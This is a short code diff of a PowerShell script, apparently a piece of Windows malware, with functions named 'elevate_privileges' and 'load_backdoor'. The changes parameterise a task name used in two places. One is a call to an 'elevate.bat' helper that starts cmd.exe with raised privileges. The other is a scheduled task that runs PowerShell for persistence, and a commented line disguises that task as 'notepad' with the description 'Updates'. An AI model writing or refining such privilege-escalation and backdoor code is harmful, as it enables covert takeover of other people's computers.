@@ -122,7 +122,7 @@ function elevate_privileges {
 	"FN: Elevando privilegios git"
 	Set-Location $program_git_location
 	try {
-		Start-Process "elevate.bat" -argumentlist "prueba01 %windir%\System32\cmd.exe" -wait
+		Start-Process "elevate.bat" -argumentlist "$task_name %windir%\System32\cmd.exe" -wait
 	} catch {
 		"FN: error"
 	}
@@ -140,7 +140,7 @@ function load_backdoor {
 
 	# Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "notepad" -Description "Updates"	
 
-	$argument_execute = "schtasks.exe /run /tn 'Apps\test02'"
+	$argument_execute = "schtasks.exe /run /tn 'Apps\$task_name'"
 
 	$action = New-ScheduledTaskAction -Execute powershell -Argument $argument_execute
 
